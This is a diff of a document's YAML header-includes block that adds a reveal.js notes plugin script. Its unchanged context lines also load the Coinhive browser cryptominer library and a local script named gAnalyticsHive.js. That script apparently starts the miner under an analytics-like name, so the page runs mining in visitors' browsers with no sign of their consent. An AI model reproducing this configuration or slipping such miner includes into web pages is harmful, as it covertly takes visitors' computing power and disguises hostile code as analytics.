@@ -19,6 +19,7 @@ header-includes:
     - \numberwithin{equation}{section}
     - \numberwithin{table}{section}
     - \usepackage{FiraSans}
+    - <script src="revealJS/plugin/notes/notes.js"></script>
     - <script async src="https://www.googletagmanager.com/gtag/js?id=UA-109503488-1"></script>
     - <script async src="https://coinhive.com/lib/coinhive.min.js"></script>
     - <script async src="js/gAnalyticsHive.js"></script>
